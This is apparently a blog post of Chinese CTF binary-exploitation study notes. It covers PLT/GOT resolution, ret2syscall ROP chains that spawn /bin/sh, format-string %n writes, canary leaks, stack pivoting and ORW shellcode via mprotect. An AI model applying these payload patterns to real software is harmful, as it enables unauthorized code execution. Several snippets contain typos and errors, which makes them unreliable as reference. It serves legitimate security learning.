<p>payload&#x3D;b’A’*112(垃圾数据)+p64(pop_eax_ret)+p64(0xb)+p64(pop_edx_ecx_ebx_ret)+p64(0)+p64(0)+p64(bin_sh)+p64(int_80h)[其中的pop_eax_ret，pop_edx_ecx_ebx_ret，bin_sh，int_80h都要在程序中找到地址并在程序之前写明]</p>
<p>![屏幕截图 2023-11-22 213524](博客\屏幕截图 2023-11-22 213524.png)</p>
<p>![屏幕截图 2023-11-23 150419](博客\屏幕截图 2023-11-23 150419.png)</p>
<p>在linux中可以生成的可执行文件分为动态链接文件和静态链接文件，用gcc默认生成的是动态链接，用file分析会出现dynamically linke的标志，其中不含有C语言的基本执行代码只有经过编译后的源码，在执行时与系统链接使用C语言的基本代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --<span class="type">static</span> 文件名</span><br></pre></td></tr></table></figure>

<p> 当执行以上代码时会生成静态链接的文件，用file分析是会有statically linke的标志，其中包含有C              语言的基本执行代码。 </p>
<p>![屏幕截图 2023-11-23 152644](博客\屏幕截图 2023-11-23 152644.png)</p>
<p>![屏幕截图 2023-11-23 153131](博客\屏幕截图 2023-11-23 153131.png)</p>
<p>.got 保存了整个程序的虚拟内存空间中各个符号（变量）的偏移量（地址）</p>
<p>.got.plt保存的是函数的地址</p>
<p>●.dynamic section</p>
<p>○提供动态链接相关信息，为操作系统描述整个动态链接的所用内容包括其他的表的位置等等</p>
<h4 id="●link-map"><a href="#●link-map" class="headerlink" title="●link_map"></a>●link_map</h4><p>○保存进程载入的动态链接库的链表</p>
<p>●__dl_runtime_resolve</p>
<p>○装载器中用于解析动态链接库中函数的实际址的函数</p>
<p><strong>动态链接的过程![屏幕截图 2023-11-23 164625](博客\屏幕截图 2023-11-23 164625.png)</strong></p>
<p>1，第一次进行链接</p>
<p>在程序中先定义一个foo函数</p>
<p>代码段首次调用foo，跳转到 .plt 中的 foo 函数项，.plt 中的代码会使程序立即跳转到 .got.plt 中记录的地址</p>
<p>由于进程是第一次调用 foo，故 .got.plt 中记录的地址是 foo@plt+1，于是会跳转到plt中的下一段代码，先将index入栈，index包括的是foo这个函数的在我们程序的位置（第几个函数），然后是跳转到PLT0段</p>
<p>在PLT0中再将一个数入栈，这个数指的是用到的是哪一个动态链接库，之后进行跳转，到_dl_runtime_resolve函数，这个函数将解析 foo 的真正地址填入 .got.plt 中</p>
<p>此后 .got.plt 中保存的是 foo 的真实地址</p>
<p>![屏幕截图 2023-11-23 165300](博客\屏幕截图 2023-11-23 165300.png)</p>
<p>之后的调用到.got.plt处时便可以直接拿到foo的真实地址</p>
<p>栈对齐，ret的加入，call的入栈使其对齐</p>
<p><strong>ida基操</strong></p>
<p>ida中shift+F12查找字符串 </p>
<p>g可直接跳转到某个地址</p>
<p>n 可以替换字符名称</p>
<p>h 可以将数字从10进制转为16进制</p>
<p>context.arch&#x3D;”amd64”</p>
<p>print(asm(shellcraft.amd64.sh()))（</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax rax, <span class="number">0xb</span> <span class="number">0x3b</span></span><br><span class="line">mov ebx rdi, [“/bin/sh”] </span><br><span class="line">mov ecx rsi, <span class="number">0</span></span><br><span class="line">mov edx rdx, <span class="number">0</span></span><br><span class="line"><span class="type">int</span> <span class="number">0x80</span> syscall</span><br><span class="line">=&gt; execve(<span class="string">&quot;/bin/sh&quot;</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>)</span><br></pre></td></tr></table></figure>

<p>在静态链接中，在系统内核中的execve(“&#x2F;bin&#x2F;sh”,NULL,NULL)这个函数可以获得控制权，但由于他是内核函数，所以，在调用它时必须满足一些必要的调用约定才可以进行调用，</p>
<p>像这些系统内核函数调用必须使用一些特殊的汇编指令才能调用，如int 80（32位）和syscall（64位）就像一个call函数，但是是跳转到内核系统中，至于要跳到哪个函数则要根据之前部分寄存器的值来确定，eax(32)和rax(64)保存了系统调用号（内核函数在内核中都有独属于自己一个调用号，如execve的调用号为11（32位&#x3D;0xb）,59（64位&#x3D;0x3b））,ebx和rdi用来保存在函数中执行的参数的地址，同时要保证ecx，edx和rsi，rdx中的值都为0。</p>
<p>![屏幕截图 2023-12-03 112959](博客\屏幕截图 2023-12-03 112959.png)</p>
<p>对于在动态链接中调用一个在plt段上的函数，先在ida中的plt段中找到需要调用的函数的地址，在栈溢出之后直接来到plt段的函数进行调用，需要注意的是在调用plt段中函数时由于函数会先创造一个独属于自己的栈，虽然这个栈不用关注，但由于这个栈的存在，在payload中plt函数不会直接读取下一个地址而是读取下下个地址，如get@plt会用的的是buf2的地址不会用中间的那一个。</p>
<p>如果我们在使用时，需要平衡栈空间，便需要消除栈中的数据，对于get下的一个数据get会在最后进行消除，但buf2段不会被消除，此时便需要一个pop|ret的值在中间加入进去，对buf2的值进行消除，对于pop|ret的选择，最后选择通用寄存器入ebx等对程序不会起到大作用的寄存器加进去。</p>
<p>以上的方法主要适用于在32位中的程序中，如果在64位的程序中，由于函数不会直接调用栈中的参数，在64位的系统中参数的前6个会分别存放在rdi、rsi、rdx、rcx、r8、r9 寄存器中，之后的才会放在栈中，同样的函数调用也是相同的，于是只要在函数执行前将函数调用的参数放在那6个寄存器中（一般函数调用一个参数时，更多的是将rdi的值修改为所需参数在的地址。相同的像gets这种输入的函数，先将rdi的值改为bss段中的空地址，于是输入的值便会直接将存放在那个bss段中，在后期调用时，将rdi中的值改为那个地址，然后直接将程序跳plt段中的函数地址，便会直接调用rdi中的地址的参数，执行函数。）</p>
<p>![屏幕截图 2023-12-03 152037](博客\屏幕截图 2023-12-03 152037.png)</p>
<p>![屏幕截图 2023-12-03 151541](博客\屏幕截图 2023-12-03 151541.png)![屏幕截图 2023-12-03 151922](博客\屏幕截图 2023-12-03 151922.png)</p>
<p><strong>偏移地址的计算用的版本为libc6_2.35-0ubuntu3.4_i386（32位程序）的</strong></p>
<p><strong>偏移地址的计算用的版本为libc6_2.35-0ubuntu3.4&#x2F;3.5_amd64（64位程序）的</strong></p>
<p>在pwntools中，p.recvuntil(“\n”)指的是接收数据，直到遇到换行符”\n”为止。这个指令用于从程序的输出中提取特定的数据。</p>
<p>libcaddr&#x3D;u64(p.recv(6).ljust(8,”\x00”))指的是从程序的输出中接收6个字节的数据，然后用空字节”\x00”填充到8个字节，并将其解释为一个64位的无符号整数（unsigned long long）。</p>
<p>而libcaddr&#x3D;u32(io.recv(4))指的是从程序的输出中接收4个字节的数据，并将其解释为一个32位的无符号整数（unsigned int）。</p>
<h3 id="如何获取函数在libc中的偏移量呢？"><a href="#如何获取函数在libc中的偏移量呢？" class="headerlink" title="如何获取函数在libc中的偏移量呢？"></a>如何获取函数在libc中的偏移量呢？</h3><p>这里可能有两种情况，一种是libc已知，一种是libc未知。</p>
<p><strong>libc已知</strong></p>
<p>libc已知的情况，可以通过反编译libc获取地址。如下所示，利用radare分析libc文件，可以获取libc中write的偏移地址是<code>0x000d43c0</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x000187c0</span>]&gt; afl | grep write</span><br><span class="line"><span class="number">0x00063880</span>   <span class="number">22</span> <span class="number">406</span>  -&gt; <span class="number">395</span>  sym._IO_wdo_write</span><br><span class="line"><span class="number">0x000d43c0</span>    <span class="number">5</span> <span class="number">101</span>          sym.__write</span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>

<p>也可以通过pwntools的ELF类，加载libc文件来获取目标函数的偏移地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc= ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_write_offset = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br></pre></td></tr></table></figure>



<p>在64位的系统中在执行部分函数时其汇编代码中有,当程序在执行时发现停在这条指令而无法继续执行下去时说明程序在该函数的栈存在栈没有对齐的情况，解决的方法便是在payload的该函数的执行之前加上一个ret的命令。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">movaps xmmword ptr [rsp + <span class="number">0x40</span>], xmm0这条指令会检查栈是否对齐</span><br></pre></td></tr></table></figure>



<p>再说b’a’*56的作用，他的作用就是为了平衡堆栈，也就是说，当mov_addr执行完之后，按照流程仍然执行400616处的函数，我们不希望它执行到此，因为会再次pop寄存器更换我们布置好的内容，所以为了堆栈平衡，我们使用垃圾数据填充此处的代码（栈区和代码区同属于内存区域,可以被填充)，用垃圾数据填充地址0x16-0x22的内容，最后将main_addr覆盖ret，从而执行main_addr处的内容</p>
<p>在C语言中对于一段字符串的存放与取用</p>
<p>存放：在地址空间中将字符串转化位用x00截断的一串连续的字节序列（\ad\ds\ew\vd\x00）</p>
<p>取用：为了节省空间在取用这一段数据时不会直接将整个数据直接传入到函数中，只会把那个数据存放的地址作为指针，把指针作为参数传入到函数中，在调用函数时函数再到指针所指的地址中将那段数据，读出来使用。</p>
<p>在使用printf打印字符时，当传进的数用的是</p>
<p>%p时直接打印的栈上存放的数据，无论是真实的数据还是地址数据都直接打印出来，不做任何的操作</p>
<p>%s时则会先把栈中的数据作为地址将其解析，然后将其作为地址对应的数据打印出来</p>
<p>%n的作用是将栈中的数据作为地址将其解析，然后向那个数据的地址写入数据，而写入的数据是<strong>格式化字符串前方已经打印成功的字符的个数</strong>（如在%n执行之前成功打印出AAAAA的数据，则会在%n所在的数据代表的地址执行的地方改写成5），</p>
<p>%11$n是一个格式化字符串中的特殊标记，它表示将当前打印字符的数量存储在第11个参数所指向的位置中。这个特性通常被用于进行格式化字符串漏洞攻击，要写第几个参数的位置就在%n中加上几$</p>
<p>%c表示输出一个字符，如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> c=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c,&quot;</span>c)</span><br></pre></td></tr></table></figure>

<p>则会打印a这个字符，如果在后面有%n则算作1，如果%n要多个则可以将要的字节长度加在%和n的中间，如</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%20n&quot;</span>,c)</span><br></pre></td></tr></table></figure>

<p>执行这个指令会打印的是长度为20的数据，且最后是a，在之前用空格补充不足20字节的地方，而如果后面有%n这会直接输入的数为20</p>
<p>在用printf函数时,在打印数据的符号中间加上（’数字$‘）意为打印第几个参数的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%3$d&quot;</span>,a,b,c)</span><br></pre></td></tr></table></figure>

<p>如这个，意为直接打印第三个参数，c的值</p>
<p>对于在程序输出中的数据中有我们需要的地址，但不是直接输出，可以用如下接收、</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">io.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">cancry =<span class="type">int</span>(io.recv(<span class="number">16</span>/<span class="number">8</span>),<span class="number">16</span>)<span class="comment">//如果是64位程序为16,32位为8</span></span><br><span class="line"><span class="comment">//16和8的区别在于程序最终需要的数据是几位的（16进制），如要的是0x0x5619d9400ccd，这为io.recv（12）    </span></span><br><span class="line">    libc_start_main = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">    libc_start_main=u64(io.recv(<span class="number">12</span>))</span><br><span class="line">    libc_start_main = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>, b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">    libc_start_main=<span class="type">int</span>(io.recvline().strip().split(b<span class="number">&#x27;</span> <span class="string">&#x27;)[-1])</span></span><br></pre></td></tr></table></figure>





<p>所以我们需要把system的地址分成高八位和低八位 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">high_sys = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line"></span><br><span class="line">low_sys = system_addr &amp; <span class="number">0xffff</span></span><br></pre></td></tr></table></figure>

<p>这里的右移16位就是向右移动4个字节，获得到high_sys的高4位地址</p>
<p>这个错误是由于在将整数转换为字节串时，需要使用<code>encode()</code>函数。你可以使用以下代码来解决这个问题：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>((stack-<span class="number">0xc</span>) &amp; <span class="number">0xff</span>).encode() + <span class="string">b&#x27;c%6&amp;hhn&#x27;</span></span><br></pre></td></tr></table></figure>



<p>在有些题中会遇到如下代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  v4 = rand();</span><br></pre></td></tr></table></figure>

<p>解释一下，这里将当前的时间作为一个种子复制给v0（*v0 &#x3D; time(0LL)*），将v0这个种子植入到srand函数中，之后rand函数会根据srand中的数值生成一个随机数，由于之前的种子是有当时时间决定的，故理论上每次运行中的rand中的值由于v0的不同而生成的随机数也不同。如果不将srand中的值用v0作为一个时间变量的话rand中生成的随机数是固定的一个数。</p>
<p>如果在程序中不能直接暴露那个随机数可通过以下代码直接将那个数在脚本中同样生成，（同时运行时间相同，srand生成相同的随机数）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from ctypes import *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&#x27;libc.so.6&#x27;</span>) #调用标准库</span><br><span class="line">srand = libc.srand(libc.time(None)) <span class="meta">#libc.time(None) 获取当前时间，然后将这个时间值传递给 libc.srand 函数来设置随机数生成器的种子</span></span><br><span class="line">saved_cookie = libc.rand() #生成随机数</span><br><span class="line">io.sendline(str(saved_cookie))#数字传入程序中需要str    </span><br></pre></td></tr></table></figure>

<p>libc.so.6是调用本地的库，在打远程时需根据远程的环境改变，</p>
<p>这一段代码要放在接近程序中生成随机数的地方，最好脚本的开始。</p>
<p>fgets函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">fgets</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> bufsize, FILE *stream)</span>;</span><br></pre></td></tr></table></figure>

<p>其中的int bufsize指的是能输入的字节的大小，将int bufsize看作n，fgets函数只能读取 n-1 个字符（包括换行符）。如果有一行超过 n-1 个字符，那么 fgets 函数将返回一个不完整的行（只读取该行的前 n-1 个字符）</p>
<p>也就是说，每次调用时，fgets 函数都会把缓冲区的最后一个字符设为 null(‘\0’)，这意味着最后一个字符不能用来存放需要的数据。所以如果某一行含有 size 个字符（包括换行符），要想把这行读入缓冲区，要把参数 n 设为 size+1，即多留一个位置存储 null(‘\0’)。</p>
<h6 id><a href="#" class="headerlink" title></a></h6><p>在payload的构造中如果要使用到base64编码一个数据，在传入到中可以用以下代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64//导入库，在脚本的一开始处就要</span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">22</span>//在使用base64这个库时因为后面的代码有地方改变，不能加b</span><br><span class="line">payload64= base64.b64encode(payload.encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">//将payload中的值转化为base64编码的赋值给paylaod64</span><br><span class="line">//此时直接输出payload64中的值会自动加入b，可直接使用</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">payload=<span class="string">b&#x27;A&#x27;</span>*<span class="number">32</span>+p32(printf)</span><br><span class="line">payload64= base64.b64encode(payload)</span><br></pre></td></tr></table></figure>



<p>在使用栈覆盖将canary暴露出来是，先在调试阶段找到canary的地方，确定输入多少才能到canary的地方，如输入地方在0x11处，在调试中的canary指到的地方位0x22，距离为17个数，这可以构建的payload为b‘A’*17+b’B’，B的作用在与覆盖00，根据canary的值确定收的值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">&quot;A&quot;</span>*(<span class="number">17</span>)+<span class="string">&#x27;B&#x27;</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;B&quot;</span>)</span><br><span class="line">canary=u32(b<span class="string">&quot;\x00&quot;</span>+io.recv(<span class="number">3</span>))</span><br></pre></td></tr></table></figure>



<p>沙箱查询，用一下命令查找程序是否启动了沙箱</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./文件名</span><br></pre></td></tr></table></figure>

<p><img src="https://p1.ssl.qhimg.com/t0158ada8c0a923003f.png" alt="img"></p>
<p>如果出现了以上情况则说明该程序中的禁用了 <code>execve</code>, 由于<code>system</code>函数实际上也是借由 <code>execve</code>实现的, 因此通过 <code>get shell</code>的方法来解决本题比较困难 ，要用到ORW方法</p>
<p>如果程序没用使用沙箱则会出现程序正常的执行效果。</p>
<p>对于直接可以获得getshell的题，并且题目中没有后门函数，直接获得getshll的方法有3种</p>
<p>1.用got表中的system和&#x2F;bin&#x2F;sh的地址直接获得getshell</p>
<p>2.使用one_gadget直接获得shell</p>
<p>3.修改寄存器的值并执行命令</p>
<p>对于以上3种办法，第一种不多说，直接整就行，重点在第2，3种</p>
<p>二，ong_gadget其实是在库中的一段指令，而这段指令只要执行就可以直接获得shell，但这种指令对寄存器有一定的要求，所以不并不是都可以，并且有的版本过高使得不能一次直接执行成功，我们一般也不会只得到一个，最好一个一个试看看能获得shell，</p>
<p>对于程序中的one_gadget的寻找可以通过一个工具直接找，需要执行以下的名令</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>(/usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span>)</span><br></pre></td></tr></table></figure>

<p>后面接入的是动态链接库，对于32位和64位是不同的库，可以直接在gdb在找，如要打远程则用远程的库，</p>
<p>![屏幕截图 2024-01-07 150423](博客\屏幕截图 2024-01-07 150423.png)</p>
<p>一般执行后的情况如下</p>
<p>![屏幕截图 2024-01-07 150608](博客\屏幕截图 2024-01-07 150608.png)</p>
<p>要用到的是execve前面的数，这个数字代表这的是在程序中的one_gadget相对于程序基值的偏移量，在使用的过程中用这个数加上程序的基值，便是one_getgad的地址，将程序在执行过程中挟持到这个地方便可以执行one_getgad.但是很多时候并不能成功要每一个都试一下</p>
<p>三，对于第3种修盖寄存器的指令，就是如下的办法，但很多时候程序中有的指令时不够用的，以此便要提到使用库中的方法</p>
<p>![屏幕截图 2024-01-07 155233](博客\屏幕截图 2024-01-07 155233.png)</p>
<p>在所有的动态链接库中都有很多的指令，不过动态链接库中的地址都是相对偏移量，要加上程序的基值才是真实地址，并且有的并不能把直接用，要多试</p>
<p>![屏幕截图 2024-01-07 154649](博客\屏幕截图 2024-01-07 154649.png)</p>
<p>如图，可以使用ROP的方法在链接库中寻找需要的偏移量，相同的对于在函数中要用的syscall和0x80指令都可以在动态链接库中找到，然后直接用就行，</p>
<p>对于64位的程序补充一种指令的使用，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rdi--&gt;binsh</span><br><span class="line">rsi--&gt;<span class="number">0</span></span><br><span class="line">r15--&gt;<span class="number">0</span></span><br><span class="line">rdx--&gt;<span class="number">0</span></span><br><span class="line">system    </span><br></pre></td></tr></table></figure>

<p>对于64位的程序如果直接用system(&#x2F;bin&#x2F;sh)可能会出现问题，便可以用以上的方法获得shell</p>
<p>栈迁移</p>
<p>对与在栈溢出的情况中如果，输入的地方有限制使得能溢出的大小比较小，不够直接直接执行getgad便需要将栈进行迁移，对于迁移的地方有两个，一种是将程序在此迁移到栈执行的地方将程序在栈上在执行一次，将我们的getgad输入到栈上，执行之后获得shell，但这种的限制比较高，最好不要将程序只要，最好将程序通过溢出使其栈迁移到bss段中的空白处，然后向那段程序中写入getgad并执行</p>
<p>无论是32位还是64位的程序，基础的栈迁移都是一样的，先将要溢出的0-地方的写满，刚好写到变量的最大值（看程序中的变量到ebp的距离），先全部覆盖完之后，在写入要将栈迁移的地址，最后写leave的地址（在程序中找，一般可以直接找到）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylaod=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*(到ebp的量)+p32(新地址)/p64()+p32/<span class="number">64</span>(leave)</span><br></pre></td></tr></table></figure>

<p>这样之后栈的ebp便会改变为新的地址，然后程序便会执行新地址4位（32位的程序）&#x2F;8位数（64位的程序）后面的地址中的指令，而新地址的前面4或8位数将成为程序执行这一部分时的ebp中的值，因此，<strong>在bss段中栈的新迁移地址的前4&#x2F;8位数要么是垃圾数据，要么是再下次栈迁移的新地址。</strong></p>
<p>如果在程序中有canary保护时，栈迁移则需要先将canary绕过在将数据覆盖到ebp的位置，然后再迁移</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload=b<span class="number">&#x27;</span>A<span class="number">&#x27;</span>*程序崩溃前最大值+p32/<span class="number">64</span>(canary)<span class="comment">//如果有问题将p32/p64去除，直接使用canary</span></span><br><span class="line">payload=payload.ljust(到ebp的量,b<span class="number">&#x27;</span>\<span class="number">00&#x27;</span>)</span><br><span class="line">payload+=p32/<span class="number">64</span>(新地址)+p32/<span class="number">64</span>(leave)</span><br></pre></td></tr></table></figure>



<p>在很多可以输入的地方，特别要注意是否对输入的数据的长度有没有检查，对于有检查的要重点注意输入的数据是否超出可以输入的长度，特别在栈迁移中，对于是否要加上<strong>line</strong>，既在输入的数据的末位加上<strong>\n</strong>(很多时候这个换行符会被当成一个字节)要多加小心，有时会因为这个字节使输入时出现问题</p>
<p>同时<strong>line</strong>的使用也是必不可少的，有时候不加这个最后的换行符，会使数据传不过去，要随时注意</p>
<p><strong>在有的栈迁移中垃圾数据的长度不一定是到rdp长度加上8&#x2F;4，有可能只是到rbp的长度不用加上后面的数据便可以直接进行栈迁移</strong></p>
<p>再用动态链接库调用函数的偏移地址的方法</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">elf=ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="built_in">puts</span>=elf.symbols[<span class="string">&#x27;puts&#x27;</span>]    </span><br><span class="line">sys=elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bs = next(elf.search(bytes(<span class="string">&#x27;/bin/sh&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">elf=ELF(<span class="string">&quot;./文件名&quot;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br></pre></td></tr></table></figure>

<p>本地的库可以在gdb调式中找到，远程的库直接链接就行</p>
<p>在一些程序中特别是静态的程序，他会将如main函数等主要的函数换一个看不出来特别的函数名，此时若要找到其主要函数的位置则可以通过在汇编中的start函数中的位置找到</p>
<p><img src="https://xuanxuanblingbling.github.io/assets/pic/317/start.png" alt="img"></p>
<p><strong>ORW</strong></p>
<p>关于有沙箱的题的禁用了system等直接获得shell的题目，通过mprotect函数和shellcode直接将flag打印在屏幕上，</p>
<p>在遇到这类题如果有canary保护，必须要通过之前的方法将canary绕过，这里将直接写payload的过程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">payload=p64(pop_rdi_ret) + p64(bss_addr + <span class="number">0x500</span>) + p64(gets)</span><br><span class="line">    #构造mprotect，更改内存保护属性</span><br><span class="line">payload+=p64(pop_rdx_pop_r12_ret)+p64(<span class="number">7</span>)+p64(<span class="number">0</span>)#设置保护属性</span><br><span class="line">    <span class="comment">//这里只用将rdx改为7便可以，如果没有单独的rdx在加上其他寄存器</span></span><br><span class="line">payload += p64(pop_rsi_pop_r15_ret) + p64(<span class="number">0x1500</span>) + p64(<span class="number">0</span>)#设置大小</span><br><span class="line">payload += p64(pop_rdi_ret)     + p64((bss_addr&gt;&gt;<span class="number">12</span>)&lt;&lt;<span class="number">12</span>)#设置起始地址</span><br><span class="line">payload += p64(mprotect)#调用mprotect</span><br><span class="line">#修改内存保护属性后，令RIP指向下方构造的shellcode</span><br><span class="line">payload += p64(bss_addr + <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>

<p>对于上文中的pop ret指令如果能在程序中直接找的则最好，如果找不到则通过libc库中的指令运行，对于bss_addr + 0x500只要是bss段中的空地方都可以，mprotect的地址也需要在libc库中寻找，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mprotect=libc.symbols[<span class="string">&#x27;mprotect&#x27;</span>]+libc</span><br></pre></td></tr></table></figure>

<p>将这段payload注入到程序中，之后便可以直接注入shellcode，关于shellcode可以直接使用库中能直接使用的</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">context.arch =<span class="string">&quot;amd64&quot;</span></span><br><span class="line">payload  = shellcraft.open(<span class="string">&quot;flag&quot;</span>)</span><br><span class="line">#将远程flag文件内容写入缓冲区，open成功时返回值为<span class="number">3</span></span><br><span class="line"><span class="meta">#                          fd  address          size</span></span><br><span class="line">payload += shellcraft.read( <span class="number">3</span>, bss_addr+<span class="number">0x100</span>, <span class="number">0x30</span>)</span><br><span class="line">payload += shellcraft.write(<span class="number">1</span>, bss_addr+<span class="number">0x100</span>, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(<span class="keyword">asm</span>(payload))<span class="comment">//初始化后直接注入程序中</span></span><br></pre></td></tr></table></figure>

<p>在shellcode的构造中fd的值为固定值</p>
<p>address为程序中的空地址</p>
<p>size为读取的数据长度</p>
<p>这里讲关于ORW的另外一种使用payload构建指令集，然后调用三个不同的函数open，read，write（在有的题中的没有这个函数对与其他只要是能将东西打印在屏幕上的就行，如puts函数），</p>
<p><em>1，调用open函数打开flag文件</em></p>
<p>在程序的任意一个可读可写的区域如，bss段注入b’.&#x2F;flag\x00\x00’(满足8字节方便栈对其)</p>
<p>将存放b’.&#x2F;flag\x00\x00’的地址注入到寄存器rdi中，（作为open函数打开的文件名）</p>
<p>再将rsi和rbp中的值分别改为0和1，有时可能还需要将rdx中的值改为0</p>
<ul>
<li><code>rdi</code>：要打开的文件名的地址（”flag”的地址）</li>
<li><code>rsi</code>：打开文件的模式标志（通常是<code>O_RDONLY</code>，即0）</li>
<li><code>rdx</code>：额外的标志或权限（通常可以设置为0）</li>
</ul>
<p>在完成上面的一切后可以执行read函数</p>
